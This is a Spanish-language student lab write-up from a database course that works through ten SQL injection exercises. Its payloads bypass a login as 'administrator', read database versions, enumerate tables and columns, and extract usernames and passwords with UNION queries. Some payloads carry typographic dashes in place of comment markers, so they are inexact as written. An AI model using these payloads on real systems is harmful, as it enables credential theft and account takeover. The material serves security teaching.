```sql
```
## Práctico 3 Base De Datos – Jose Ignacio Lavecchia

### 1. Inyección SQL básica
'+ OR 1 = 1 –  

También se podría hacer algo como esto:

SELECT * FROM products WHERE category = '' OR '1' = '1' AND released = 0; 

Suponiendo que `released` es un booleano en el que `0` es el valor de productos que no han sido liberados y `1` el de productos que ya han sido liberados.

### 2. Modificación del parámetro `username`
Modificamos el parámetro de `username` con `administrator '--` ya que así todo lo que siga en la consulta será ignorado por el `--` de los comentarios.

### 3. Uso del comando `UNION`
La idea es realizar un ataque con el comando `UNION`, pero antes debemos asegurarnos de que el número de columnas en la consulta original coincide con el número de columnas de nuestra SQL Injection. Para esto, el comando `UNION` solo va a funcionar si el número y tipo de columnas coinciden.

Utilizamos un payload como este: 
'+UNION+SELECT+'abc','def'+FROM+dual--

Después, intentamos obtener algún tipo de información de la base de datos, como por ejemplo la versión, utilizando el siguiente payload:

'+UNION+SELECT+BANNER,+NULL+FROM+v$version--

### 4. Determinación del número de columnas
Primero determinamos el número de columnas que está devolviendo la query original y cuáles contienen la información. Para ello, utilizamos el siguiente payload:

'+UNION+SELECT+'abc','def'#

(# = Comentario)

Después utilizamos el siguiente payload para obtener la versión de la base de datos:

'+UNION+SELECT @@version,+NULL#

### 5. Obtención de tablas y datos de usuarios
Primero determinamos el número de columnas que está devolviendo la query original y cuáles contienen la información. Utilizamos el siguiente payload:

'+UNION+SELECT+'abc','def'#

Después, utilizamos el siguiente payload para obtener las tablas en la base de datos:

'+UNION+SELECT+table_name,+NULL+FROM+information_schema.columns+WHERE+table_name = 'users_abcdef'—

Después de encontrar las columnas que contienen `username` y `password`, utilizamos el siguiente payload para obtener los datos de todos los usuarios:

'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef—

Finalmente encontramos la contraseña para el usuario “administrator” y nos logueamos.

### 6. Listado de tablas y columnas
Primero determinamos el número de columnas y qué columnas contienen los datos. Utilizamos este payload:

'+UNION+SELECT+'abc','def'+FROM+dual—

Luego, obtenemos información sobre las tablas en la base de datos:

'+UNION+SELECT+table_name,+NULL+FROM+all_tables—

Después de identificar la tabla que tiene las credenciales, usamos el siguiente payload para obtener las columnas:

'+UNION+SELECT+column_name,+NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'—

Por último, obtenemos los nombres de usuario y contraseñas con el siguiente payload:

'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF—

Buscamos al usuario llamado 'administrator' y su contraseña para iniciar sesión.

### 7. Determinación del número de columnas
Para determinar el número de columnas devueltas por la query, ejecutamos este payload:

'+UNION+SELECT+NULL,NULL—

Continuamos añadiendo `NULL` hasta que la consulta compile correctamente.

### 8. Identificación de columnas de tipo texto
Primero determinamos el número de columnas, y luego reemplazamos `NULL` por strings hasta que obtengamos una columna de tipo texto:

'+UNION+SELECT+NULL,NULL,NULL—

'+UNION+SELECT+'seraestalacolumnadetipotexto?',NULL,NULL—

### 9. Obtención de credenciales
Primero determinamos el número de columnas y qué columnas contienen datos con este payload:

'+UNION+SELECT+'abc','def'—

Después, obtenemos las credenciales de la tabla de usuarios:

'+UNION+SELECT+username,+password+FROM+users—

Buscamos el usuario llamado 'administrator' y nos logueamos.

### 10. Concatenación de credenciales
Finalmente, determinamos el número de columnas devueltas y usamos este payload para concatenar las credenciales en una sola columna, separadas por `~`:

'+UNION+SELECT+NULL,'abc'—

'+UNION+SELECT+username||'~'||password+FROM+users—
